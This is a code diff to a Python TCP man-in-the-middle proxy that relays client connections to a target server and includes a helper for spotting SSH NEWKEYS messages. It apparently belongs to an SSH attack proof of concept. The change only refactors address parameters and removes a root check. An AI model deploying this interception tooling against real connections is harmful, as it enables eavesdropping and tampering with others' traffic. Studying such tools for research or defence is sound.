@@ -1,8 +1,5 @@
 from threading import Thread
-import os, socket
-
-def is_root():
-    return os.geteuid() == 0
+import socket
 
 newkeys_payload = b'\x00\x00\x00\x0c\x0a\x15'
 def contains_newkeys(data):
@@ -22,20 +19,20 @@ def pipe_socket_stream(in_socket, out_socket):
     in_socket.close()
     out_socket.close()
 
-def run_tcp_mitm(server_ip, port, forward_client_to_server = pipe_socket_stream, forward_server_to_client = pipe_socket_stream):
+def run_tcp_mitm(proxy_ip, proxy_port, server_ip, server_port, forward_client_to_server = pipe_socket_stream, forward_server_to_client = pipe_socket_stream):
     mitm_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    mitm_socket.bind(("0.0.0.0", port))
+    mitm_socket.bind((proxy_ip, proxy_port))
     mitm_socket.listen(5)
 
-    print(f"[+] MitM Proxy started. Listening on port {port} for incoming connections...")
+    print(f"[+] MitM Proxy started. Listening on {(proxy_ip, proxy_port)} for incoming connections...")
     try:
         while True:
             client_socket, client_addr = mitm_socket.accept()
             print(f"[+] Accepted connection from: {client_addr}")
-            print(f"[+] Establishing new target connection to {(server_ip, port)}.")
+            print(f"[+] Establishing new target connection to {(server_ip, server_port)}.")
             # Establish a new connection to the target and 
             server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            server_socket.connect((server_ip, port))
+            server_socket.connect((server_ip, server_port))
             print("[+] Spawning new forwarding threads to handle client connection.")
             forward_client_to_server_thread = Thread(target=forward_client_to_server, args=(client_socket, server_socket), daemon=True)
             forward_client_to_server_thread.start()
